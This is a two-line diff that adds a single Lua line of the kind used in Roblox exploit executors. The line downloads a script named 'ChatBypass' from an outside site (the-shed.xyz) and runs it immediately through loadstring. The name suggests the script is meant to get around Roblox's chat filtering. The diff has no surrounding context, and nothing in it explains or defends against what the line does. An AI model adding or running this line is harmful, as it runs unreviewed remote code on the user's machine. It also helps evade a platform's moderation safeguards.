@@ -1,0 +1,2 @@
+
+loadstring(game:HttpGet("https://the-shed.xyz/roblox/scripts/ChatBypass", true))()
